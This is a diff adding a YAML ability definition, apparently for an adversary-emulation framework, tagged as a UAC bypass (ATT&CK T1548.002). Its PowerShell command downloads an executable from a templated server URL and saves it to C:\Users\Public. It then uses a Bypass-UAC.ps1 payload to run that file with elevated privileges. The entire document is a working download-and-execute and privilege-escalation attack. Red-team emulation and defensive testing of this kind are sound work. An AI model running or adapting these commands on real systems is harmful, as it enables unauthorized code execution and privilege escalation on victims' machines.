@@ -1,0 +1,16 @@
+- id: e3db134c-4aed-4c5a-9607-c50183c9ef9e
+  name: Bypass UAC Medium
+  description: Bypass user account controls - medium
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1548.002
+    name: "Abuse Elevation Control Mechanism: Bypass User Access Control"
+  platforms:
+    windows:
+      psh:
+        command: |
+          $url="#{server}/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""); [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);
+          $job = Start-Job -ScriptBlock { Import-Module -Name .\Bypass-UAC.ps1; Bypass-UAC -Command "C:\Users\Public\$name.exe -group #{group}"; };
+          Receive-Job -Job $job -Wait;
+        payloads:
+        - Bypass-UAC.ps1
